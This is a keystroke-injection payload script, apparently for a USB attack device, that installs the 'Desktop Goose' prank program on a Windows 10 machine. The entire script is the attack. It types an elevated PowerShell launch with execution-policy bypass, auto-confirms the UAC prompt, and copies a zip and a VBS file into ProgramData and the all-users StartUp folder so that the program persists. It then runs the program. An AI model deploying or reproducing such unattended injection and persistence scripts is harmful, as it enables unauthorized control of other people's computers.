// =============================================================================
// Title: Desktop Goose from SD card.
// Author: @beigeworm | https://github.com/beigeworm
// Description: Copy and start Desktop Goose from the SD card and add persistance.
// Target: Windows 10
// =============================================================================

// *USB SETTING*
// exfil lootchest [REQUIRERD]

// =============================================================================

// Script Setup
layout('us'); 
// typingSpeed(1,1);

// Main Payload
press("GUI r");
delay(500);
type("powershell -NoP -NonI -Exec Bypass");
delay(500);
press("CONTROL SHIFT ENTER");
delay(2000);
press("ALT y");
delay(4000);

// Copy Files (with persistance)
type("copy d:/apps/goose.zip c:/ProgramData/Microsoft/Windows/\"Start Menu\"\n");
press("ENTER");
type("copy d:/apps/persoose.vbs \"c:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/persoose.vbs\"");
press("ENTER");
type("copy e:/apps/goose.zip c:/ProgramData/Microsoft/Windows/\"Start Menu\"\n");
press("ENTER");
type("copy e:/apps/persoose.vbs \"c:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/persoose.vbs\"");
press("ENTER");
type("copy f:/apps/goose.zip c:/ProgramData/Microsoft/Windows/\"Start Menu\"\n");
press("ENTER");
type("copy f:/apps/persoose.vbs \"c:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/persoose.vbs\"");
press("ENTER");
delay(2000);

type("Expand-Archive -LiteralPath \"c:/ProgramData/Microsoft/Windows/Start Menu/goose.zip\""); 
type(" -DestinationPath \"c:/ProgramData/Microsoft/Windows/Start Menu\"");
delay(200);
press("ENTER");
delay(6000);

type("start \"c:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp/persoose.vbs\" ; exit");
delay(200);
press("ENTER");
type("exit");
press("ENTER");
